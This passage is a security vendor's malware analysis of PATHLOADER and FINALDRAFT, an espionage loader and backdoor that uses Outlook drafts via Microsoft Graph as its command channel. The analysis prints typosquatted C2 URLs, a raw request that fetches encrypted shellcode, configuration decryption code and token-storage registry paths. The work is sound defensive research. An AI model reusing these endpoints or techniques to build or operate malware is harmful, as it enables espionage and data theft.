<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts — Elastic Security Labs</title><meta name="description" content="During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications."/><meta property="og:title" content="You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts — Elastic Security Labs"/><meta property="og:description" content="During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications."/><meta property="og:image" content="https://www.elastic.co/security-labs/assets/images/finaldraft/Security Labs Images 13.jpg?a6b3bdfac6384e929d82efd0ec5b5bdd"/><meta property="og:image:alt" content="During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications."/><meta property="og:site_name"/><meta property="og:url" content="https://www.elastic.co/security-labs/finaldraft"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts — Elastic Security Labs"/><meta name="twitter:description" content="During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications."/><meta name="twitter:image" content="https://www.elastic.co/security-labs/assets/images/finaldraft/Security Labs Images 13.jpg?a6b3bdfac6384e929d82efd0ec5b5bdd"/><meta name="twitter:image:alt" content="During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications."/><link rel="canonical" href="https://www.elastic.co/security-labs/finaldraft"/><link rel="preload" href="/security-labs/logo.svg" as="image" fetchpriority="high"/><link rel="preload" as="image" imageSrcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=3840&amp;q=75 3840w" imageSizes="100vw" fetchpriority="high"/><meta name="next-head-count" content="19"/><script src="https://play.vidyard.com/embed/v4.js" type="text/javascript" async=""></script><link rel="icon" href="/security-labs/favicon.svg"/><link rel="mask-icon" href="/security-labs/favicon.svg" color="#1C1E23"/><link rel="apple-touch-icon" href="/security-labs/favicon.svg"/><meta name="theme-color" content="#1C1E23"/><link rel="preload" href="/security-labs/_next/static/media/6d93bde91c0c2823-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/369c6e283c5acc6e-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/92f44bb82993d879-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/ee71530a747ff30b-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/9fac010bc1f02be0-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><link rel="preload" href="/security-labs/_next/static/media/cbf5fbad4d73afac-s.p.woff2" as="font" type="font/woff2" crossorigin="anonymous" data-next-font="size-adjust"/><script id="google-tag-manager" data-nscript="beforeInteractive">
          (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
          new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
          j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
          'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
          })(window,document,'script','dataLayer','GTM-KNJMG2M');
          </script><link rel="preload" href="/security-labs/_next/static/css/265ed7605fd03477.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/265ed7605fd03477.css" data-n-g=""/><link rel="preload" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" as="style"/><link rel="stylesheet" href="/security-labs/_next/static/css/1007ff9e696f6f88.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/security-labs/_next/static/chunks/polyfills-78c92fac7aa8fdd8.js"></script><script src="/security-labs/_next/static/chunks/webpack-7987c6fda769d510.js" defer=""></script><script src="/security-labs/_next/static/chunks/framework-7a7e500878b44665.js" defer=""></script><script src="/security-labs/_next/static/chunks/main-ebd33a9f1cae5951.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/_app-cb8664d1d3df2511.js" defer=""></script><script src="/security-labs/_next/static/chunks/fec483df-43ee602fabdfe3a4.js" defer=""></script><script src="/security-labs/_next/static/chunks/877-34f408271ef44c22.js" defer=""></script><script src="/security-labs/_next/static/chunks/511-d08fe0fdd6f8a984.js" defer=""></script><script src="/security-labs/_next/static/chunks/683-a5053c37fe5bd0c9.js" defer=""></script><script src="/security-labs/_next/static/chunks/402-65580a7ec2bb27f6.js" defer=""></script><script src="/security-labs/_next/static/chunks/616-0b017b9cfa597392.js" defer=""></script><script src="/security-labs/_next/static/chunks/pages/%5Bslug%5D-b0c191de1a3710e4.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_buildManifest.js" defer=""></script><script src="/security-labs/_next/static/4Kiz4W6h6K4GvjoQBSLKb/_ssgManifest.js" defer=""></script></head><body><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNJMG2M" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><div id="__next"><main class="__variable_0351a5 __variable_1f211e __variable_a5b5f5 flex flex-col min-h-screen"><div class="scroll-percentage-container"><div class="scroll-percentage-bar" style="width:0%"></div></div><nav class="fixed w-full z-40" data-headlessui-state=""><div class="bg-gradient-to-b from-zinc-900 from-20% h-[200%] to-transparent absolute inset-0 z-0 pointer-events-none"></div><div class="container relative z-10"><div class="flex h-16 items-center justify-between"><div class="flex items-center justify-start w-full"><div><a class="hover:opacity-50 transition" href="/security-labs"><img alt="elastic security labs logo" fetchpriority="high" width="200" height="30" decoding="async" data-nimg="1" style="color:transparent" src="/security-labs/logo.svg"/></a></div><div class="hidden lg:ml-6 lg:block"><div class="flex space-x-4"><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/about"><span>About</span></a><div class="relative" data-headlessui-state=""><div><button class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" id="headlessui-menu-button-:R2kpm:" type="button" aria-haspopup="menu" aria-expanded="false" data-headlessui-state="">Topics<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="ml-1 -mr-1 h-4 w-4 text-zinc-400 relative top-[1px]"><path fill-rule="evenodd" d="M5.23 7.21a.75.75 0 011.06.02L10 11.168l3.71-3.938a.75.75 0 111.08 1.04l-4.25 4.5a.75.75 0 01-1.08 0l-4.25-4.5a.75.75 0 01.02-1.06z" clip-rule="evenodd"></path></svg></button></div></div><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/vulnerability-updates"><span>Vulnerability updates</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/reports"><span>Reports</span></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="/security-labs/category/tools"><span>Tools</span></a></div></div><div class="hidden lg:ml-auto lg:block"><div class="flex items-center space-x-4"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/finaldraft"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><a class="flex lg:inline-flex font-light my-1 py-1 px-2 font-display font-semibold lg:text-sm xl:text-base items-center transition hover:hover-link hover:text-white focus:accessible-link-focus" href="https://www.elastic.co/security-labs/rss/feed.xml"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" aria-hidden="true" class="h-4 w-4 mr-1"><path d="M3.75 3a.75.75 0 00-.75.75v.5c0 .414.336.75.75.75H4c6.075 0 11 4.925 11 11v.25c0 .414.336.75.75.75h.5a.75.75 0 00.75-.75V16C17 8.82 11.18 3 4 3h-.25z"></path><path d="M3 8.75A.75.75 0 013.75 8H4a8 8 0 018 8v.25a.75.75 0 01-.75.75h-.5a.75.75 0 01-.75-.75V16a6 6 0 00-6-6h-.25A.75.75 0 013 9.25v-.5zM7 15a2 2 0 11-4 0 2 2 0 014 0z"></path></svg><span class="hidden xl:block">Subscribe</span></a><a class="font-display inline-flex items-center justify-center rounded font-semibold disabled:!select-none disabled:!bg-gray-400 bg-blue-600 text-white hover:bg-blue-500 enabled:hover:text-white/80 transition-colors px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://cloud.elastic.co/registration?cta=cloud-registration&amp;tech=trial&amp;plcmt=navigation&amp;pg=security-labs">Start free trial</a><a class="font-display inline-flex items-center justify-center rounded font-semibold text-white disabled:!select-none disabled:!bg-gray-400 button px-4 py-2 text-sm flex-1 lg:flex-auto" href="https://www.elastic.co/contact">Contact sales</a></div></div></div><div class="-mr-2 flex lg:hidden"><a class="rounded flex items-center p-4 text-white focus:outline-none focus:ring-0 focus:ring-offset-1 focus:ring-offset-zinc-600 group" href="https://search.elastic.co/?location%5B0%5D=Security%20Labs&amp;referrer=https://www.elastic.co/security-labs/finaldraft"><div class="flex items-center relative font-display"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"></path></svg></div></a><button class="inline-flex items-center justify-center rounded-md p-2 text-gray-400 hover:bg-gray-700 hover:text-white focus:outline-none focus:ring-2 focus:ring-inset focus:ring-white" id="headlessui-disclosure-button-:R59m:" type="button" aria-expanded="false" data-headlessui-state=""><span class="sr-only">Open navigation menu</span><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="block h-6 w-6"><path stroke-linecap="round" stroke-linejoin="round" d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"></path></svg></button></div></div></div></nav><main class="mb-20 flex-1 flex flex-col"><div class="h-48 md:h-64"><div class="after:absolute after:block after:bg-blue-400 after:blur-3xl after:content-[&#x27; &#x27;] after:h-96 after:opacity-5 after:right-0 after:rounded-full after:top-20 after:w-1/2 after:z-0 before:absolute before:block before:blur-3xl before:bg-orange-400 before:content-[&#x27; &#x27;] before:h-96 before:left-0 before:opacity-5 before:rounded-full before:w-1/2 before:z-0 w-full h-full relative"><div class="relative z-10 w-full h-[125%] -top-[25%] bg-no-repeat bg-cover bg-bottom flex items-center justify-center" style="background-image:url(/security-labs/grid.svg)"></div></div></div><article class="px-4"><div class="max-w-7xl mx-auto relative z-10 flex flex-col space-y-4"><div class="eyebrow break-words"><time class="block mb-2 md:mb-0 md:inline-block article-published-date" dateTime="2025-02-13T00:00:00.000Z">13 February 2025</time><span class="hidden md:inline-block md:mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/cyril-francois">Cyril François</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/jia-yu-chan">Jia Yu Chan</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/salim-bitam">Salim Bitam</a><span class="mx-2">•</span><a class="hover:text-blue-400 text-xs md:text-sm whitespace-nowrap author-name" href="/security-labs/author/daniel-stepanic">Daniel Stepanic</a></div><h1 class="font-bold leading-tighter text-3xl md:text-5xl"><span>You've Got Malware: FINALDRAFT Hides in Your&nbsp;Drafts</span></h1><p class="text-zinc-200 text-base md:text-xl">During a recent investigation (REF7707), Elastic Security Labs discovered new malware targeting a foreign ministry. The malware includes a custom loader and backdoor with many features including using Microsoft’s Graph API for C2 communications.</p><div class="flex items-center mt-4 text-zinc-200 text-sm space-x-4 border-t border-white/25 pt-4"><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M12 6v6h4.5m4.5 0a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg><span>34 min read</span></span><span class="flex items-center space-x-1"><svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" aria-hidden="true" class="h-4 w-4 text-zinc-400"><path stroke-linecap="round" stroke-linejoin="round" d="M9.568 3H5.25A2.25 2.25 0 003 5.25v4.318c0 .597.237 1.17.659 1.591l9.581 9.581c.699.699 1.78.872 2.607.33a18.095 18.095 0 005.223-5.223c.542-.827.369-1.908-.33-2.607L11.16 3.66A2.25 2.25 0 009.568 3z"></path><path stroke-linecap="round" stroke-linejoin="round" d="M6 6h.008v.008H6V6z"></path></svg><span><a class="hover:text-blue-400 whitespace-nowrap" href="/security-labs/category/malware-analysis">Malware analysis</a></span></span></div></div><div class="max-w-7xl mx-auto"><div class="bg-zinc-900 border border-zinc-800 drop-shadow-lg p-5 sm:p-8 md:p-10 rounded-3xl mt-5 md:mt-10"><div class="relative w-full rounded-lg overflow-hidden aspect-video"><img alt="You&#x27;ve Got Malware: FINALDRAFT Hides in Your Drafts" fetchpriority="high" decoding="async" data-nimg="fill" class="object-cover absolute h-full w-full" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="100vw" srcSet="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=640&amp;q=75 640w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=750&amp;q=75 750w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=828&amp;q=75 828w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1080&amp;q=75 1080w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1200&amp;q=75 1200w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=1920&amp;q=75 1920w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=2048&amp;q=75 2048w, /security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=3840&amp;q=75 3840w" src="/security-labs/_next/image?url=%2Fsecurity-labs%2Fassets%2Fimages%2Ffinaldraft%2FSecurity%20Labs%20Images%2013.jpg&amp;w=3840&amp;q=75"/><div class="absolute border border-white/50 inset-0 mix-blend-overlay rounded-lg z-10"></div></div></div></div><div class="lg:max-w-7xl mx-auto relative mt-12 lg:grid lg:grid-cols-4 lg:gap-8 items-start"><div class="flex justify-center lg:col-span-3"><div class="prose lg:prose-lg prose-invert w-full article-content"><div><h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="summary" class="absolute -top-32"></span>Summary</h1>
<p>While investigating REF7707, Elastic Security Labs discovered a new family of previously unknown malware that leverages Outlook as a communication channel via the Microsoft Graph API. This post-exploitation kit includes a loader, a backdoor, and multiple submodules that enable advanced post-exploitation activities.</p>
<p>Our analysis uncovered a Linux variant and an older PE variant of the malware, each with multiple distinct versions that suggest these tools have been under development for some time.</p>
<p>The completeness of the tools and the level of engineering involved suggest that the developers are well-organized. The extended time frame of the operation and evidence from our telemetry suggest it’s likely an espionage-oriented campaign.</p>
<p>This report details the features and capabilities of these tools.</p>
<p></p>
<p>For the campaign analysis of REF7707 - check out <a href="https://www.elastic.co/security-labs/fragile-web-ref7707">From South America to Southeast Asia: The Fragile Web of REF7707</a>.</p>
<h1 class="font-bold leading-tighter text-3xl md:text-5xl relative"><span id="technical-analysis" class="absolute -top-32"></span>Technical Analysis</h1>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="pathloader" class="absolute -top-32"></span>PATHLOADER</h2>
<p>PATHLOADER is a Windows PE file that downloads and executes encrypted shellcode retrieved from external infrastructure.</p>
<p>Our team recovered and decrypted the shellcode retrieved by PATHLOADER, extracting a new implant we have not seen publicly reported, which we call FINALDRAFT. We believe these two components are used together to infiltrate sensitive environments.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="configuration" class="absolute -top-32"></span>Configuration</h3>
<p>PATHLOADER is a lightweight Windows executable at 206 kilobytes; this program downloads and executes shellcode hosted on a remote server. PATHLOADER includes an embedded configuration stored in the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">.data</code> section that includes C2 and other relevant settings.</p>
<p></p>
<p>After Base64 decoding and converting from the embedded hex string, the original configuration is recovered with two unique typosquatted domains resembling security vendors.</p>
<pre><code>https://poster.checkponit.com:443/nzoMeFYgvjyXK3P;https://support.fortineat.com:443/nzoMeFYgvjyXK3P;*|*</code></pre>
<p><em>Configuration from PATHLOADER</em></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="api-hashing" class="absolute -top-32"></span>API Hashing</h3>
<p>In order to block static analysis efforts, PATHLOADER performs API hashing using the <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function">Fowler–Noll–Vo hash</a> function. This can be observed based on the immediate value <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">0x1000193</code> found 37 times inside the binary. The API hashing functionality shows up as in-line as opposed to a separate individual function.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="string-obfuscation" class="absolute -top-32"></span>String Obfuscation</h3>
<p>PATHLOADER uses string encryption to obfuscate functionality from analysts reviewing the program statically. While the strings are easy to decrypt while running or if using a debugger, the obfuscation shows up in line, increasing the complexity and making it more challenging to follow the control flow. This obfuscation uses SIMD (Single Instruction, Multiple Data) instructions and XMM registers to transform the data.</p>
<p></p>
<p>One string related to logging <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">WinHttpSendRequest</code> error codes used by the malware developer was left unencrypted.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="executionbehavior" class="absolute -top-32"></span>Execution/Behavior</h3>
<p>Upon execution, PATHLOADER employs a combination of  <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GetTickCount64</code> and <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">Sleep</code> methods to avoid immediate execution in a sandbox environment. After a few minutes, PATHLOADER parses its embedded configuration, cycling through both preconfigured C2 domains (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">poster.checkponit[.]com</code>, <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">support.fortineat[.]com</code>) attempting to download the shellcode through <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HTTPS</code> <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">GET</code> requests.</p>
<pre><code>GET http://poster.checkponit.com/nzoMeFYgvjyXK3P HTTP/1.1
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
Host: poster.checkponit.com
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36</code></pre>
<p>The shellcode is AES encrypted and Base64 encoded. The AES decryption is performed using the shellcode download URL path <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">“/nzoMeFYgvjyXK3P”</code> as the 128-bit key used in the call to the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CryptImportKey</code> API.</p>
<p></p>
<p>After the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">CryptDecrypt</code> call, the decrypted shellcode is copied into previously allocated memory. The memory page is then set to <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">PAGE_EXECUTE_READ_WRITE</code> using the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">NtProtectVirtualMemory</code> API. Once the page is set to the appropriate protection, the shellcode entrypoint is called, which in turn loads and executes the next stage: FINALDRAFT.</p>
<h2 class="font-bold text-2xl md:text-4xl relative"><span id="finaldraft" class="absolute -top-32"></span>FINALDRAFT</h2>
<p>FINALDRAFT is a 64-bit malware written in C++ that focuses on data exfiltration and process injection. It includes additional modules, identified as parts of the FINALDRAFT kit, which can be injected by the malware. The output from these modules is then forwarded to the C2 server.</p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="entrypoint" class="absolute -top-32"></span>Entrypoint</h3>
<p>FINALDRAFT exports a single entry point as its entry function. The name of this function varies between samples; in this sample, it is called <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">UpdateTask</code>.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="initialization" class="absolute -top-32"></span>Initialization</h3>
<p>The malware is initialized by loading its configuration and generating a session ID.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="configuration-loading-process" class="absolute -top-32"></span>Configuration loading process</h4>
<p>The configuration is hardcoded in the binary in an encrypted blob. It is decrypted using the following algorithm.</p>
<pre><code>for ( i = 0; i &lt; 0x149A; ++i )
  configuration[i] ^= decryption_key[i &amp; 7];</code></pre>
<p><em>Decryption algorithm for configuration data</em></p>
<p>The decryption key is derived either from the Windows product ID (<code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductId</code>) or from a string located after the encrypted blob. This is determined by a global flag located after the encrypted configuration blob.</p>
<p></p>
<p></p>
<p>The decryption key derivation algorithm is performed as follows:</p>
<pre><code>uint64_t decryption_key = 0;
do
  decryption_key = *data_source++ + 31 * decryption_key;
while ( data_source != &amp;data_source[data_source_length] );</code></pre>
<p><em>Decryption key derivation algorithm</em></p>
<p>The configuration structure is described as follows:</p>
<pre><code>struct Configuration // sizeof=0x149a
{
  char c2_hosts_or_refresh_token[5000];
  char pastebin_url[200];
  char guid[36];
  uint8_t unknown_0[4];
  uint16_t build_id;
  uint32_t sleep_value;
  uint8_t communication_method;
  uint8_t aes_encryption_key[16];
  bool get_external_ip_address;
  uint8_t unknown_1[10]
};</code></pre>
<p><em>Configuration structure</em></p>
<p>The configuration is consistent across variants and versions, although not all fields are utilized. For example, the communication method field wasn&#x27;t used in the main variant at the time of this publication, and only the MSGraph/Outlook method was used. However, this is not the case in the ELF variant or prior versions of FINALDRAFT.</p>
<p>The configuration also contains a Pastebin URL, which isn’t used across any of the variants. However, this URL was quite useful to us for pivoting from the initial sample.</p>
<h4 class="font-bold leading-tight text-lg md:text-2xl relative"><span id="session-id-derivation-process" class="absolute -top-32"></span>Session ID derivation process</h4>
<p>The session ID used for communication between FINALDRAFT and C2 is generated by creating a random GUID, which is then processed using the <a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function">Fowler-Noll-Vo</a> (FNV) hash function.</p>
<p></p>
<h3 class="font-bold leading-tight text-xl md:text-3xl relative"><span id="communication-protocol" class="absolute -top-32"></span>Communication protocol</h3>
<p>During our analysis, we discovered that different communication methods are available from the configuration; however, the most contemporary sample at this time uses only the <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">COutlookTrans</code> class, which abuses the Outlook mail service via the Microsoft Graph API. This same technique was observed in <a href="https://www.elastic.co/security-labs/update-to-the-REF2924-intrusion-set-and-related-campaigns">SIESTAGRAPH</a>, a previously unknown malware family reported by Elastic Security Labs in February 2023 and attributed to a PRC-affiliated threat group.</p>
<p>The Microsoft Graph API token is obtained by FINALDRAFT using the <a href="https://login.microsoftonline.com/common/oauth2/token">https://login.microsoftonline.com/common/oauth2/token</a> endpoint. The refresh token used for this endpoint is located in the configuration.</p>
<p></p>
<p></p>
<p>Once refreshed, the Microsoft Graph API token is stored in the following registry paths based on whether the user has administrator privileges:</p>
<ul>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UUID\&lt;uuid_from_configuration&gt;</code></li>
<li><code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\UUID\&lt;uuid_from_configuration&gt;</code></li>
</ul>
<p>This token is reused across requests, if it is still valid.</p>
<p></p>
<p>The communication loop is described as follows:</p>
<ul>
<li>Create a session email draft if it doesn’t already exist.</li>
<li>Read and delete command request email drafts created by the C2.</li>
<li>Process commands</li>
<li>Write command response emails as drafts for each processed command.</li>
</ul>
<p>A check is performed to determine whether a session email, in the form of a command response email identified by the subject <code class="px-1.5 py-1 rounded not-prose bg-[var(--tw-prose-invert-pre-bg)] whitespace-break-spaces text-[85%] text-emerald-600">p_&lt;session-id&gt;</code>, already exists. If it does not, one is created in the mail drafts. The content of this email is base64 encoded but not AES encrypted.</p>
<p></p>
<p></p>
<p>The session data is described in the structure below.</p>
<pre><code>struct Session
{
  char random_bytes[30];
  uint32_t total_size;
  char field_22;
  uint64_t session_id;
  uint64_t build_number;
  char field_33;
};</code></pre>
<p><em>Session data structure</em></p>
